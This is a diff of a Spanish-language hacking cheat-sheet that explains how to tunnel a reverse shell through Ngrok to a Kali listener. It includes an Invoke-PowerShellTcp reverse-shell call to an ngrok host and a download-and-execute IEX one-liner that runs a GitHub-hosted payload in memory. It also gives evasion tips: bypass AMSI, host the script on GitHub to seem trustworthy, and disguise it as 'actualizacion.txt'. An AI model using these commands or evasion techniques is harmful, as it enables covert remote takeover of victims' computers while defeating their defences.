@@ -1,6 +1,6 @@
 # Ngrok
 
-Tags: #Ngrok #Windows #Powershell 
+Tags: #Ngrok #Windows #Powershell #AMSI
 
 ## Instalación
 
@@ -28,7 +28,7 @@ Tags: #Ngrok #Windows #Powershell
 ```bash 
 ❯ ngrok tcp 443         # Exponemos publico el puerto 443 y Ngrok nos devolvera un 'tcp://2.tcp.ngrok.io:19215'. Utilizaremos la parte de '2.tcp.ngrok.io' en IPAddress y '19215' para el Port en el script de la revershell de abajo.  
 
-❯ rlwrap nc -nlvp 443   # Recibir la revershell en Kali
+❯ nc -nlvp 443   # Recibir la revershell en Kali
 ```
 
 ```bash 
@@ -38,12 +38,19 @@ Tags: #Ngrok #Windows #Powershell
 
 	Invoke-PowerShellTcp -Reverse -IPAddress 2.tcp.ngrok.io -Port 19215 
 
-Nota: Este script lo podemos cargar a nuestro Github, ya que eso lo hara mas confiable al momento de llamarlo desde la maquina victima 
-Nota: Podemos colocarle un nombre discreto al script como 'actualizacion.txt'
+Nota: 
+	1. Debemos Bypasear AMSI, de lo contrario nos detectara codigo malicioso
+	1. Este script lo podemos cargar a nuestro Github, ya que eso lo hara mas confiable al momento de llamarlo desde la maquina victima 
+	2. Podemos colocarle un nombre discreto al script como 'actualizacion.txt'
 ```
 
 ```bash 
 # Desde la maquina victima con Windows llamamos al script que se encuentra almacenado en nuestro Github, esto lo hace a nivel de memoria por lo que es dificil de detectar y sirve como metodo de evasion
 
+Nota: La url que se coloca es la que nos muestra al momento de darle 'Raw' al script almacenado en 'Github'
+
 ❯ powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Omar/Scripts/main/Invoke-PowershellTCP.ps1')"
+
+Nota: 
+	1. Si se ejecuta el comando desde un 'cmd' en Windows colocarlo asi como aparece. Pero si se esta ejecutando desde la consola de PS quitarle 'powershell -c'
 ```
